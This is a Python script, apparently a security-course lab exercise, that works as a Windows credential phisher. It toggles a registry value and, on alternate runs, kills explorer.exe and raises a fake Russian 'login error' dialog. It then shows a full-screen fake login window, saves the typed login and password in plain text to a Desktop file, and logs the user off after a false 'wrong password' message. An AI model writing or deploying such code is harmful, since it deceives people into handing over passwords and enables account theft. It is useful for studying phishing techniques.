import winreg
import os
from tkinter import messagebox
from tkinter import *
import ctypes
import subprocess


def kill_explorer():
    #os.system("taskkill /f /im explorer.exe")
    subprocess.call("taskkill /f /im explorer.exe", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def log_off():
    user32 = ctypes.WinDLL('user32')
    user32.ExitWindowsEx(0, 0)

def write_datas():
    with open(r"C:\Users\coon4i\Desktop\datas.txt", "w") as file:
        file.write(f"login: {login.get()}")
        file.write('\n')
        file.write(f"password: {password.get()}")
        file.write('\n\n')
        messagebox.showerror("Ошибка", "Неверный логин или пароль")
        log_off()


location = winreg.HKEY_CURRENT_USER
path = winreg.OpenKeyEx(location, r"laba_oib11", 0, winreg.KEY_ALL_ACCESS)
current_key = int(winreg.EnumValue(path, 0)[1])


if current_key == 1:
    winreg.SetValueEx(path, "key", 0, winreg.REG_SZ, "0")
    kill_explorer()
    root = Tk()
    root.withdraw()

    messagebox.showerror("Error", "Ошибка входа в учетную запись")
    window = Tk()
    window.overrideredirect(True)
    window.title("ПРОВЕРКА")
    window.state('zoomed')
    window["bg"] = "blue"
    login = Entry(window, background="white", foreground="black", justify="center", width=40)#, state="normal")
    password = Entry(window, background="white", foreground="black", justify="center", width=40, show='*')#, state="normal")
    login.place(relx=.410, rely=.600)
    password.place(relx=.410, rely=.650)
    invite_to_login = Label(window, background="black", foreground="white", text="Введите ваш логин:", justify="left")
    invite_to_login.place(relx=.300, rely=.600)
    invite_to_password = Label(window, background="black", foreground="white", text="Введите ваш пароль:", justify="left")
    invite_to_password.place(relx=.300, rely=.650)
    button = Button(window, text="Войти")
    button.config(command=write_datas)
    button.place(relx=.490, rely=.710)
    root.mainloop()
    window.mainloop()
elif current_key == 0:
    winreg.SetValueEx(path, "key", 0, winreg.REG_SZ, "1")
